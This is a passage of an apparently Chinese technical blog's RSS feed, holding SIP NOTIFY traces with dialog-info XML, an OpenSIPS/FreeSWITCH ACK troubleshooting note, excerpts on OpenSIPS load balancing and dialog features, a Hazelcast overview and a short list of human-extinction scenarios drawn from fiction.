&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;From: &amp;lt;sip:9999@wdd.cc&amp;gt;;tag&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;d009-12c2f272e7622c1cd9b6aa285a7b9736
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CSeq: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; NOTIFY
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Call-ID: 1-774753@127.0.1.1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Route: &amp;lt;sip:192.168.2.109:19666;ftag&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1;lr&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Max-Forwards: &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;140&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User-Agent:WMS
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Event: dialog
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Contact: &amp;lt;sip:core@192.168.2.109:18627&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Subscription-State: active;expires&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;120&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Type: application/dialog-info+xml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;?xml version&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;?&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;dialog-info xmlns&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;urn:ietf:params:xml:ns:dialog-info&amp;#34;&lt;/span&gt; version&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;           state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;full&amp;#34;&lt;/span&gt; entity&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sip:9999@wdd.cc&amp;#34;&lt;/span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;utf-8&amp;#34;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;dialog-info&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xmlns=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;urn:ietf:params:xml:ns:dialog-info&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;version=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;state=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;full&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;entity=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sip:9999@wdd.cc&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;lt;/dialog-info&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;通话通知&#34;&gt;通话通知&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NOTIFY sip:8003@192.168.2.109:5060 SIP/2.0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Via: SIP/2.0/UDP 192.168.2.109:18627;branch&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;z9hG4bKcef7.91c1e716.0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;To: &amp;lt;sip:8003@wdd.cc&amp;gt;;tag&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;From: &amp;lt;sip:9999@wdd.cc&amp;gt;;tag&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;d009-12c2f272e7622c1cd9b6aa285a7b9736
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CSeq: &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; NOTIFY
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Call-ID: 1-774753@127.0.1.1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Route: &amp;lt;sip:192.168.2.109:19666;ftag&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1;lr&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Max-Forwards: &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;466&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User-Agent:WMS
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Event: dialog
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Contact: &amp;lt;sip:core@192.168.2.109:18627&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Subscription-State: active;expires&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;108&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Type: application/dialog-info+xml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;?xml version&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;?&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;dialog-info xmlns&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;urn:ietf:params:xml:ns:dialog-info&amp;#34;&lt;/span&gt; version&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;           entity&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sip:9999@wdd.cc&amp;#34;&lt;/span&gt; state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;partial&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;dialog id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dSY.1nmnTyMLGx-qR3pCvNHbvKgx
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;9N&amp;#34;&lt;/span&gt; call-id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dSY.1nmnTyMLGx-qR3pCvNHbvKgxtp9N&amp;#34;&lt;/span&gt; direction&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;recipient&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;state&amp;gt;confirmed&amp;lt;/state&amp;gt;&amp;lt;remote&amp;gt;&amp;lt;identity&amp;gt;sip:8001@wdd.cc&amp;lt;/identity&amp;gt;&amp;lt;target uri&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sip:8001@
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;d.cc&amp;#34;&lt;/span&gt;/&amp;gt;&amp;lt;/remote&amp;gt;&amp;lt;local&amp;gt;&amp;lt;identity&amp;gt;sip:9999@wdd.cc&amp;lt;/identity&amp;gt;&amp;lt;target uri&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sip:9999@wdd.cc&amp;#34;&lt;/span&gt;/&amp;gt;&amp;lt;/local&amp;gt;&amp;lt;/dialog&amp;gt;&amp;lt;/dialog-info&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;?xml version&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;?&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;dialog-info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    xmlns&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;urn:ietf:params:xml:ns:dialog-info&amp;#34;&lt;/span&gt; version&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;           entity&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sip:9999@wdd.cc&amp;#34;&lt;/span&gt; state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;partial&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;dialog id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dSY.1nmnTyMLGx-qR3pCvNHbvKgx
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;9N&amp;#34;&lt;/span&gt; call-id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dSY.1nmnTyMLGx-qR3pCvNHbvKgxtp9N&amp;#34;&lt;/span&gt; direction&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;recipient&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;state&amp;gt;confirmed&amp;lt;/state&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;remote&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &amp;lt;identity&amp;gt;sip:8001@wdd.cc&amp;lt;/identity&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &amp;lt;target uri&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sip:8001@wdd.cc&amp;#34;&lt;/span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;/remote&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;local&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &amp;lt;identity&amp;gt;sip:9999@wdd.cc&amp;lt;/identity&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &amp;lt;target uri&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sip:9999@wdd.cc&amp;#34;&lt;/span&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;/local&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;/dialog&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/dialog-info&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;请求体的格式说明参见：&lt;a href=&#34;https://tools.ietf.org/html/rfc4235#section-4&#34;&gt;https://tools.ietf.org/html/rfc4235#section-4&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Load Balancing in OpenSIPS</title>
      <link>https://wdd.js.org/opensips/blog/load-balance/</link>
      <pubDate>Tue, 09 Mar 2021 17:52:04 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/blog/load-balance/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://opensips.org/Documentation/Tutorials-LoadBalancing-1-9&#34;&gt;https://opensips.org/Documentation/Tutorials-LoadBalancing-1-9&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;1-load-balancing-in-opensips&#34;&gt;1.  Load Balancing in &lt;strong&gt;OpenSIPS&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;The &amp;ldquo;load-balancing&amp;rdquo; module comes to provide traffic routing based on load. Shortly, when &lt;strong&gt;OpenSIPS&lt;/strong&gt; routes calls to a set of destinations, it is able to keep the load status (as number of ongoing calls) of each destination and to choose to route to the less loaded destination (at that moment). &lt;strong&gt;OpenSIPS&lt;/strong&gt; is aware of the capacity of each destination - it is pre-configured with the maximum load accepted by the destinations. To be more precise, when routing, &lt;strong&gt;OpenSIPS&lt;/strong&gt; will consider the less loaded destination not the destination with the smallest number of ongoing calls, but the destination with the largest available slot.&lt;/p&gt;</description>
    </item>
    <item>
      <title>ACK 无法正常送到FS</title>
      <link>https://wdd.js.org/opensips/ch7/miss-ack/</link>
      <pubDate>Tue, 09 Mar 2021 17:10:54 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch7/miss-ack/</guid>
      <description>&lt;p&gt;通过sngrep抓包发现，通话正常，ACK无法送到FS。导致通话一段时间后，FS因为没有收到ACK，就发送了BYE来挂断呼叫。&lt;/p&gt;
&lt;p&gt;sngrep定位到问题可能出在OpenSIPS上，然后分析opensips的日志。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Mar  &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; 16:58:00 dd opensips&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;84&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;: ERROR:dialog:dlg_validate_dialog: failed to validate remote contact: dlg&lt;span style=&#34;color:#f92672&#34;&gt;=[&lt;/span&gt;sip:9999@192.168.2.161:5080;transport&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;udp&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; , req    &lt;span style=&#34;color:#f92672&#34;&gt;=[&lt;/span&gt;sip:192.168.2.109:18627;lr;ftag&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;CX3CDinLARXn1ZRNIlPaFexgirQczdr7;did&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;4c1.a9657441&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的日志，提示问题出在dialog验证上，dialog验证失败的原因可能与contact头有关。&lt;/p&gt;
&lt;p&gt;然后我有仔细的分析了一下SIP转包。发现contact中的ip地址192.168.2.161并不是fs的地址。但是它为什么会出现在fs回的200ok中呢？&lt;/p&gt;
&lt;p&gt;这是我就想起了fs vars.xml，其中有几个参数是用来配置服务器的ip地址的。&lt;/p&gt;
&lt;p&gt;由于我的fs是个树莓派，ip是自动分配的，重启之后，可能获取了新的ip。但是老的ip地址，还是存在于vars.xml中。&lt;/p&gt;
&lt;p&gt;然后我就去排查了一下fs的var.xml， 发现下面三个参数都是192.168.2.161， 但是实际上树莓派的地址已经不是这个了。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bind_server_ip
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;external_rtp_ip
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;external_sip_ip
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;解决方案：改变fs vars.xml中的地址配置信息，然后重启fs。&lt;/p&gt;
&lt;p&gt;除了fs的原因，还有一部分原因可能是错误的使用了&lt;strong&gt;fix_nated_contact。&lt;/strong&gt;&lt;!-- raw HTML omitted --&gt;**&lt;!-- raw HTML omitted --&gt;务必记住：对于位于边界的SIP服务器来说，对于进入的SIP请求，一般需要fix_nated_contaced。对于这个请求的响应，则不需要进行nat处理。&lt;/p&gt;
&lt;p&gt;深入思考一下，为什么concact头修改的错了，往往ack就会有问题呢？ 实际上ack请求的url部分，就是由响应消息的contact头的ulr部分。&lt;/p&gt;</description>
    </item>
    <item>
      <title>stompjs 心跳机制调研</title>
      <link>https://wdd.js.org/posts/2021/03/ewinve/</link>
      <pubDate>Thu, 04 Mar 2021 10:13:46 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/03/ewinve/</guid>
      <description></description>
    </item>
    <item>
      <title>hazelcast IDMG</title>
      <link>https://wdd.js.org/posts/2021/02/xlwnvv/</link>
      <pubDate>Wed, 24 Feb 2021 11:54:24 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/02/xlwnvv/</guid>
      <description>&lt;p&gt;IDMG是 IN-MEMORY DATA GRID的缩写。&lt;/p&gt;
&lt;p&gt;官方的一句话介绍：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The industry&amp;rsquo;s fastest, most scalable in-memory data grid, where speed, scalability and continuous processing are the core requirements for deployment.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;抽取关键词：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;快&lt;/li&gt;
&lt;li&gt;可伸缩&lt;/li&gt;
&lt;li&gt;内存&lt;/li&gt;
&lt;li&gt;分布式&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;简介&#34;&gt;简介&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;An IMDG (in-memory data grid) is a set of networked/clustered computers that pool together their random access memory (RAM) to let applications share data structures with other applications running in the cluster.&lt;/p&gt;
&lt;p&gt;The primary advantage is speed, which has become critical in an environment with billions of mobile, IoT devices and other sources continuously streaming data. With all relevant information in RAM in an IMDG, there is no need to traverse a network to remote storage for transaction processing. The difference in speed is significant – minutes vs. sub-millisecond response times for complex transactions done millions of times per second.&lt;/p&gt;</description>
    </item>
    <item>
      <title>macbook pro 1708 换电池记录</title>
      <link>https://wdd.js.org/posts/2021/02/egkbht/</link>
      <pubDate>Thu, 18 Feb 2021 20:39:19 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/02/egkbht/</guid>
      <description></description>
    </item>
    <item>
      <title>人类灭绝的7种方式</title>
      <link>https://wdd.js.org/posts/2021/02/ploder/</link>
      <pubDate>Fri, 12 Feb 2021 19:33:19 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/02/ploder/</guid>
      <description>&lt;p&gt;人类将以什么方式走向灭绝，很多科幻电影中都有过设想。&lt;/p&gt;
&lt;p&gt;最近读到一本书《人类灭绝》来自日本作家高野和明的科幻小说给出系统的介绍。小说中有一份报告，叫做《海斯曼报告》。&lt;/p&gt;
&lt;p&gt;下面表格中的1-5是报告中提到的人类灭绝方式，6-7是我自己添加。&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;种类&lt;/th&gt;
          &lt;th&gt;类别&lt;/th&gt;
          &lt;th&gt;举例&lt;/th&gt;
          &lt;th&gt;相关电影，或者书籍&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;宇宙规模的灾难&lt;/td&gt;
          &lt;td&gt;小行星撞地球，太阳燃尽&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;2&lt;/td&gt;
          &lt;td&gt;地球规模的环境变动&lt;/td&gt;
          &lt;td&gt;地球磁场的南北逆转现象，环境污染&lt;/td&gt;
          &lt;td&gt;《2012》《后天》&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;3&lt;/td&gt;
          &lt;td&gt;核战&lt;/td&gt;
          &lt;td&gt;二战 日本 核武器&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;4&lt;/td&gt;
          &lt;td&gt;疫病 病毒威胁 生物武器&lt;/td&gt;
          &lt;td&gt;电影生化危机，今年的新冠肺炎疫情，HIV&lt;/td&gt;
          &lt;td&gt;《生化危机》《行尸走肉》&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;5&lt;/td&gt;
          &lt;td&gt;人类进化&lt;/td&gt;
          &lt;td&gt;由于基因突变，产生更加智能的人类&lt;/td&gt;
          &lt;td&gt;《东京食尸鬼》《人类灭绝》&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;6&lt;/td&gt;
          &lt;td&gt;AI失控&lt;/td&gt;
          &lt;td&gt;人工智能出现自我意识&lt;/td&gt;
          &lt;td&gt;《我，机器人》《终结者系列》《黑客帝国系列》&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;7&lt;/td&gt;
          &lt;td&gt;外星人入侵&lt;/td&gt;
          &lt;td&gt;高层次文明入侵低层次文明&lt;/td&gt;
          &lt;td&gt;《三体》&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;于三体不同的是，作者从人类第5种可能性展开小说。如果你喜欢三体的话，《人类灭绝》这本小说，也是非常值得一读的。&lt;/p&gt;</description>
    </item>
    <item>
      <title>Cross-dialog data accessing</title>
      <link>https://wdd.js.org/opensips/blog/cross-dialog-data/</link>
      <pubDate>Thu, 11 Feb 2021 20:24:31 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/blog/cross-dialog-data/</guid>
      <description>&lt;p&gt;原文：&lt;a href=&#34;https://blog.opensips.org/2020/05/18/cross-dialog-data-accessing/&#34;&gt;https://blog.opensips.org/2020/05/18/cross-dialog-data-accessing/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn.nlark.com/yuque/0/2021/jpeg/280451/1613046284137-3191caef-6fac-4674-a1c8-b4d7c55e851a.jpeg#align=left&amp;display=inline&amp;height=280&amp;margin=%5Bobject%20Object%5D&amp;originHeight=234&amp;originWidth=351&amp;size=0&amp;status=done&amp;style=none&amp;width=420&#34;&gt;&lt;!-- raw HTML omitted --&gt;There are several calling scenarios – typical Class V – where multiple SIP dialogs may be involved. And to make it work, you need, &lt;strong&gt;&lt;em&gt;from one dialog, to access the data that belongs to another dialog&lt;/em&gt;&lt;/strong&gt;. By data we mean here dialog specific data, like dialog variables, profiles or flags, and, even more, accounting data (yes, the accounting engine is so powerful that it ended be used for storing a lot of information during the calls).&lt;!-- raw HTML omitted --&gt;Let’s take a quick look at a couple of such scenarios:&lt;/p&gt;</description>
    </item>
    <item>
      <title>Dialog triggers, or how to control the calls from script</title>
      <link>https://wdd.js.org/opensips/blog/dialog-trigers/</link>
      <pubDate>Thu, 11 Feb 2021 20:23:40 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/blog/dialog-trigers/</guid>
      <description>&lt;p&gt;原文：&lt;a href=&#34;https://blog.opensips.org/2020/05/26/dialog-triggers-or-how-to-control-the-calls-from-script/&#34;&gt;https://blog.opensips.org/2020/05/26/dialog-triggers-or-how-to-control-the-calls-from-script/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The OpenSIPS script is a very powerful tool, both in terms of capabilities (statements, variables, transformations) and in terms of integration (support for DB, REST, Events and more).&lt;!-- raw HTML omitted --&gt;So why not using the OpenSIPS script (or the script routes) to interact and control your call, in order to build more complex services on top of the dialog support?&lt;!-- raw HTML omitted --&gt;For this purpose, OpenSIPS 3.1 introduces three new per-dialog triggers:&lt;/p&gt;</description>
    </item>
    <item>
